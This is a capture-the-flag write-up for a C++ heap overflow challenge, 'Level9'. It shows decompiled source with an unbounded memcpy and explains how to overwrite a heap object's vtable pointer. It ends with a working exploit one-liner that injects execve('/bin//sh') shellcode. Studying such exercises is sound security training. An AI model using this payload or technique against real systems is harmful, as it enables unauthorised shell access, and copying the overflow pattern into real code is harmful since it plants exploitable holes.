# Level9

## Code

```
#include <iostream>
#include <string.h>

class N
{
    private:
        char _annotation[100];
        int         _n;

    public:
        N(int n);
        void        setAnnotation(char *str);
        virtual int operator+(N const & rhs);
        virtual int operator-(N const & rhs);
};

N::N(int n)
{
  this->_n = n;
  return;
}

void N::setAnnotation(char *str)
{
  memcpy(this->_annotation, str, strlen(str));
}

int N::operator+(N const & rhs)
{
  return (this->_n + rhs._n);
}

int N::operator-(N const & rhs)
{
  return (this->_n - rhs._n);
}


int main(int argc, char *argv[])
{
  N *n1;
  N *n2;
  
  if (argc < 2) {
    exit(1);
  }

  n1 = new N(5);
  n2 = new N(6);
  n1->setAnnotation(argv[1]);
  return (*n1 + *n2);
}
```

## Explanation


- Here we have a c++ program, much more difficult to read and understand in assembly,
    or in decompilers...

- After some thinking and searching, we understood that the program instantiates two
    instances of a class called N on the heap with the keyword new, and then calls
    the method "setAnnotation" of the first instance.

- Also, we noticed that the program returns 11 when given arguments, which happens
    to be the addition of the parameters given to the constructors of the two N
    instances: 5 and 6. That's why we had the intuition that the program returns the
    sum of the 2 instances, and that the class N had a + operator method.

- The setAnnotation method, a setter for a private attribute does a memcpy of argv[1] on
    the address of the object + 4 bytes (where the private attribute is)

- This use of memcpy is a security breach since it copies argv[1] no matter its len,
    so if you overflow the annotation variable, you can alter the memory of the rest
    of the class, and even reach the memory allocated for the second instance...

- In c++, when a class has virtual methods, the first four bytes of an instance of this 
    class (or the first 8 bytes in 64bits) is a pointer to a vtable which contains
    the addresses of the definitions of the virtual methods of the class. So that's what we
    need to overwrite for the second object, so that when the operator + method is called
    at the end, we can redirect it to a shellcode.

- So, to do this we need to make the program jump twice. First we need to overwrite the
    vtable pointer of the second instance to make it jump to our fake vtable, where there
    will be a second address (a fake vtable entry) where our shellcode will be located.

- Thanks to ltrace, we could see the addresses of our two instances :
            N1 : 0x804a008
            N2 : 0x804a078

- We can see that N2's vtable is 112 bytes after N1's, but since our memcpy starts at
    N1's address + 4, we will need to write 108 bytes to reach N2's vtable.

- So, our payload will look like this :
        address of our shellcode (0x0804a00c + 4 = 0x0804a010)
    +   our shellcode
    +   (108 - shellcodeLength - 4) random characters to reach N2's vtable
    +   the address of where this string will be copied (0x804a008 + 4 = 0x0804a00c)

## Exploit

- Here's our final command :
```
$    ./level9 "$(python -c "print '\x08\x04\xa0\x10'[::-1] + '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + 'A' * (108 - 24 - 4) + '\x08\x04\xa0\x0c'[::-1]")"
```